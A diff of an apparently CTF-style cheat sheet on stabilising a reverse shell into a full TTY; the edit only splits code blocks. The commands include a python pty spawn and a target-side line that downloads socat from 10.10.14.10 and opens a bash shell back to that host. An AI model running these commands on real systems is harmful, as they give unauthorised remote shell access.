@@ -11,8 +11,17 @@ tags: ["shell", "python", "bash", "sh", "tty"]
 
 ```bash
 which sh
+```
+
+```bash
 which bash
+```
+
+```bash
 which python3
+```
+
+```bash
 which python
 ```
 
@@ -24,10 +33,14 @@ which python
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
+```bash
 #Ctrl-Z to send the process to background, then
 stty raw -echo; fg
+```
 
+```bash
 #After fg, press enter again, then
 export TERM=xterm-256color
 ```
@@ -48,10 +61,14 @@ python3 -m http.server 80
 ```bash
 # In our local Linux machine
 socat file:`tty`,raw,echo=0 tcp-listen:1337
+```
 
+```bash
 # In target machine
 wget -q http://10.10.14.10/socat -O /tmp/socat && chmod +x /tmp/socat && /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.10:1337
+```
 
+```bash
 # In our local Linux machine
 export TERM=xterm-256color
 ```
